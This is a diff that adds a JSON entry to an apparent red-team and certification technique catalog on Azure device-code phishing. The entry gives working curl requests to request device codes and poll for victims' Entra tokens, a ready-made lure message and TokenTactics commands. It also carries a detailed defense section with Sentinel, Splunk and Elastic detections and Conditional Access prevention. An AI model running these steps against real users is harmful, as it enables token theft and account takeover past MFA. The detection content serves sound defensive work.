@@ -1,0 +1,104 @@
+{
+  "id": "azure-device-code-phishing",
+  "name": "Azure Device-Code Phishing - Capture Entra Tokens",
+  "command": "az login --use-device-code",
+  "description": "Abuse the OAuth 2.0 device-authorization flow to phish Entra ID (Azure AD) tokens. The attacker requests a device code against a first-party client, sends the victim the real https://microsoft.com/devicelogin page and a user_code, and when the victim authenticates (passing MFA), the attacker polls the token endpoint and receives the victim's access and refresh tokens - no password or credential ever touches the attacker.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Cloud Security",
+  "subcategory": "Azure Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "o365blog / TokenTactics",
+  "tags": [
+    "azure",
+    "entra-id",
+    "device-code",
+    "phishing",
+    "oauth",
+    "token",
+    "mfa-bypass"
+  ],
+  "mitre": [
+    "T1528",
+    "T1078.004"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY IT WORKS ===\n  The device-code flow is meant for input-constrained devices. The victim\n  authenticates on the genuine Microsoft page, so MFA and the real URL both\n  look legitimate; the attacker just harvests the resulting tokens.\n\n=== STEP 1: REQUEST A DEVICE CODE (attacker) ===\n  # first-party client id (Azure CLI shown); FOCI clients give broad refresh tokens\n  curl -s -X POST \\\n    'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode' \\\n    -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' \\\n    -d 'scope=https://graph.microsoft.com/.default offline_access'\n  # returns device_code, user_code, verification_uri, interval\n\n=== STEP 2: LURE (send to victim) ===\n  \"Go to https://microsoft.com/devicelogin and enter code: <user_code>\"\n\n=== STEP 3: POLL FOR TOKENS (attacker) ===\n  curl -s -X POST \\\n    'https://login.microsoftonline.com/common/oauth2/v2.0/token' \\\n    -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' \\\n    -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' \\\n    -d 'device_code=<device_code>'\n  # once the victim signs in: access_token + refresh_token returned\n\n=== EASIER WITH TOOLING ===\n  # TokenTactics (PowerShell)\n  Import-Module .\\TokenTactics.ps1\n  Get-AzureToken -Client MSGraph           # starts a device-code request\n  # az CLI (your own login, or to show the flow):\n  az login --use-device-code\n\n=== USE THE TOKENS ===\n  Refresh token -> mint tokens for Graph, ARM, Exchange, etc.\n  Pass to AADInternals / GraphRunner / ROADtools for post-exploitation.",
+  "examples": [
+    {
+      "label": "Request a device code (Azure CLI client)",
+      "command": "curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode' -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' -d 'scope=https://graph.microsoft.com/.default offline_access'"
+    },
+    {
+      "label": "Poll token endpoint after victim signs in",
+      "command": "curl -s -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' -d 'device_code=<device_code>'"
+    },
+    {
+      "label": "Device-code login with TokenTactics",
+      "command": "Get-AzureToken -Client MSGraph"
+    }
+  ],
+  "references": [
+    {
+      "title": "o365blog - Introducing a new phishing technique (device code)",
+      "url": "https://aadinternals.com/post/phishing/"
+    },
+    {
+      "title": "Microsoft docs - OAuth 2.0 device authorization grant",
+      "url": "https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cloud-tokentactics",
+      "note": "TokenTactics automates the device-code request and polling.",
+      "rel": "next"
+    },
+    {
+      "id": "azure-managed-identity-token",
+      "note": "Token-based access is the broader primitive.",
+      "rel": "alternative"
+    },
+    {
+      "id": "cloud-aadinternals",
+      "note": "Use captured tokens for Entra post-exploitation.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The device-code grant lets any client start an authentication the victim completes on the genuine Microsoft sign-in page. Because the victim sees a real URL and satisfies MFA normally, the phish is convincing, and the attacker receives valid access and refresh tokens without ever handling a credential.",
+    "prerequisites": "A public client_id (first-party IDs work and often need no consent), network access to login.microsoftonline.com, and a victim willing to enter the user_code on the device-login page within the code's validity window.",
+    "impact": "Theft of valid Entra access and refresh tokens, including FOCI refresh tokens that mint tokens for many first-party resources - effectively account takeover that already passed MFA.",
+    "detection": "[MITRE T1528] Entra sign-in logs with authenticationProtocol=deviceCode, especially where the sign-in IP/device differs from where tokens are later used; device-code sign-ins to Azure CLI / other first-party clients the user does not normally use.",
+    "artifacts": "Entra ID SigninLogs events with AuthenticationProtocol=deviceCode; subsequent token use from a different IP/ASN than the interactive sign-in; unusual appId (e.g. Azure CLI 04b07795-...).",
+    "splunk_spl": "index=azure sourcetype=azure:aad:signin authenticationProtocol=deviceCode\n| stats count values(appDisplayName) by userPrincipalName, ipAddress\n| where count>0",
+    "elastic_kql": "azure.signinlogs.properties.authentication_protocol:\"deviceCode\"",
+    "sentinel_kql": "SigninLogs\n| where AuthenticationProtocol == \"deviceCode\"\n| summarize Count=count(), IPs=make_set(IPAddress) by UserPrincipalName, AppDisplayName",
+    "sigma_rules": "azure_device_code_authentication",
+    "prevention": "Block the device-code flow with a Conditional Access authentication-flows policy except for the few device types that need it; require compliant/managed devices; user-train against entering codes they did not initiate; alert on any deviceCode sign-in and on token use from a new IP shortly after.",
+    "sources": [
+      "https://aadinternals.com/post/phishing/",
+      "https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Entra device-code authentication (phishing)",
+        "logic": "SigninLogs\n| where AuthenticationProtocol == \"deviceCode\"\n| summarize Count=count(), IPs=make_set(IPAddress), Apps=make_set(AppDisplayName) by UserPrincipalName, bin(TimeGenerated, 1h)",
+        "data_source": "entra-id",
+        "attack": [
+          "T1528",
+          "T1078.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate device-code use on input-constrained devices (smart TVs, IoT, some CLI logins)",
+        "tuning": "Allowlist expected device-code client IDs/users; alert on new UPNs and on tokens later used from a different IP"
+      }
+    ]
+  }
+}
